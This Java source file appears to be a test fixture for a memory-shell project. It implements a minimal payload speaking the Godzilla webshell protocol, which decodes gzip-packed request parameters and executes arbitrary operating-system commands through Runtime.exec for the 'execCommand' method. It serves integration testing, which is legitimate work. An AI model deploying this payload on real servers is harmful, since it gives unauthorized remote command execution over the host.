package com.reajason.javaweb.blade.integration;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/**
 * Godzilla payload sent with the first request. The shell defines it and then uses the equals
 * chain plus toString for every later request. Only the methods this test exercises are
 * implemented. The shell calls newInstance() reflectively, so the class and its implicit
 * constructor must stay public.
 */
public class GodzillaPayload {

    private ByteArrayOutputStream output;
    private byte[] requestData;

    @Override
    public boolean equals(Object obj) {
        if (obj instanceof ByteArrayOutputStream) {
            output = (ByteArrayOutputStream) obj;
        } else if (obj instanceof byte[]) {
            requestData = (byte[]) obj;
        }
        return false;
    }

    @Override
    public String toString() {
        try {
            byte[] result = run(parse(requestData));
            GZIPOutputStream gzip = new GZIPOutputStream(output);
            gzip.write(result);
            gzip.close();
        } catch (Throwable e) {
            writeError(e);
        }
        return "";
    }

    private byte[] run(Map<String, String> params) throws Exception {
        String method = params.get("methodName");
        if ("test".equals(method)) {
            return "ok".getBytes(StandardCharsets.UTF_8);
        }
        if ("execCommand".equals(method)) {
            int count = Integer.parseInt(params.get("argsCount"));
            String[] command = new String[count];
            for (int i = 0; i < count; i++) {
                command[i] = params.get("arg-" + i);
            }
            Process process = Runtime.getRuntime().exec(command);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            copy(process.getInputStream(), out);
            copy(process.getErrorStream(), out);
            process.waitFor();
            return out.toByteArray();
        }
        return new byte[0];
    }

    private void writeError(Throwable error) {
        try {
            ByteArrayOutputStream trace = new ByteArrayOutputStream();
            error.printStackTrace(new PrintStream(trace, true, "UTF-8"));
            GZIPOutputStream gzip = new GZIPOutputStream(output);
            gzip.write(trace.toByteArray());
            gzip.close();
        } catch (Throwable ignored) {
        }
    }

    private static Map<String, String> parse(byte[] data) throws Exception {
        Map<String, String> params = new HashMap<>();
        GZIPInputStream gzip = new GZIPInputStream(new ByteArrayInputStream(data));
        ByteArrayOutputStream key = new ByteArrayOutputStream();
        int read;
        while ((read = gzip.read()) != -1) {
            if (read == 2) {
                byte[] lengthBytes = new byte[4];
                readFully(gzip, lengthBytes);
                int length = (lengthBytes[0] & 255)
                        | ((lengthBytes[1] & 255) << 8)
                        | ((lengthBytes[2] & 255) << 16)
                        | ((lengthBytes[3] & 255) << 24);
                byte[] value = new byte[length];
                readFully(gzip, value);
                params.put(key.toString("UTF-8"), new String(value, StandardCharsets.UTF_8));
                key.reset();
            } else {
                key.write(read);
            }
        }
        gzip.close();
        return params;
    }

    private static void readFully(InputStream in, byte[] bytes) throws Exception {
        int offset = 0;
        while (offset < bytes.length) {
            int read = in.read(bytes, offset, bytes.length - offset);
            if (read < 0) {
                throw new EOFException();
            }
            offset += read;
        }
    }

    private static void copy(InputStream in, OutputStream out) throws Exception {
        byte[] buffer = new byte[4096];
        int read;
        while ((read = in.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
    }
}
